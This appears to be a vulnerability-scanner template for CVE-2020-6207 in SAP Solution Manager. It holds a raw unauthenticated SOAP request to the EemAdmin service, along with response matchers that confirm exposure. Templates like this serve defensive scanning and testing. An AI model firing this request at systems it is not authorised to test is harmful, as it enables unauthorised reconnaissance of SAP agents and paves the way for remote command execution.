id: CVE-2020-6207

info:
  name: SAP Solution Manager - 远程命令执行(CVE-2020-6207)
  author: wintry
  severity: critical
  description: SAP Solution Manager (SolMan) running version 7.2 has a remote command execution vulnerability within the SAP EEM servlet (tc~smd~agent~application~eem). The vulnerability occurs due to missing authentication checks when submitting SOAP requests to the /EemAdminService/EemAdmin page to get information about connected SMDAgents, send HTTP request (SSRF), and execute OS commands on connected SMDAgent.
  tags: sap
  metadata:
    max-request: 1

http:
  - raw:
      - |
        POST /EemAdminService/EemAdmin HTTP/1.1
        Host: {{Hostname}}
        SOAPAction: ""
        Content-Type: text/xml; charset=UTF-8
        Connection: close

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:adm="http://sap.com/smd/eem/admin/"><soapenv:Header/><soapenv:Body><adm:getAllAgentInfo/></soapenv:Body></soapenv:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        words:
          - ":Envelope"
          - ":Body"
          - ":getAllAgentInfoResponse"
        part: body
        condition: and

      - type: status
        status:
          - 200

      - type: word
        words:
          - "text/xml"
          - "SAP NetWeaver Application Server"
        part: header
        condition: and
